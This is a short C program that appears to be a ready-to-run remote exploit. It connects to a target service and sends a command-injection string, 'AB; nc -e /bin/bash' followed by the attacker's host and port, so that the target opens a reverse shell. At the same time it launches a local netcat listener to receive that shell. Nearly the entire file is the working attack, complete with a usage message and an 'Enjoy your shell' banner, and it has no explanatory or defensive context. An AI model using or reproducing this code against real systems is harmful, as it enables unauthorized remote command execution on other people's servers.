#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define GRN   "\e[0;32m"
#define RESET "\e[0m"

#define MAX   256

void exploit(char *rhost, char *rport, char *lhost, char *lport) {

  pid_t pid;

  if((pid = fork()) == -1) {
    fprintf(stderr, "[-] Unable to fork the process\n");
    exit(2);
  }

  if(pid == 0) {

    struct sockaddr_in serv_addr;
    int sockfd, rport_num;
    char recvline[MAX];
    char payload[MAX] = "AB; nc -e /bin/bash ";

    rport_num = strtol(rport, NULL, 10);
   
    strcat(payload, lhost);
    strcat(payload, " ");
    strcat(payload, lport);

    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
      fprintf(stderr, "[-] Unable to create socket\n");
      exit(3);
    } 

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(rhost);
    serv_addr.sin_port = htons(rport_num);

    puts(GRN"[+] Connecting to the target..."RESET);
    sleep(1);

    if((connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr))) == -1) {
      fprintf(stderr, "[-] Unable to connect to the server\n");
      exit(4);
    }

    puts(GRN"[+] Enjoy your shell :)\n"RESET);

    recv(sockfd, recvline, sizeof(recvline), 0);
    send(sockfd, payload, strlen(payload), 0);


  }else {
  
    char *args[] = {"nc", "-nlvp", lport, NULL};

    execvp("nc", args);

  }

}

int main(int argc, char **argv) {

  if(argc != 5) {
    fprintf(stderr, "[-] Incorrect amount of arguments supplied. Expected 5\n");
    fprintf(stderr, "[?] Usage: %s <rhost> <rport> <lhost> <lport>\n", argv[0]);
    return 1;
  }

  exploit(argv[1], argv[2], argv[3], argv[4]);
  return EXIT_SUCCESS;

}
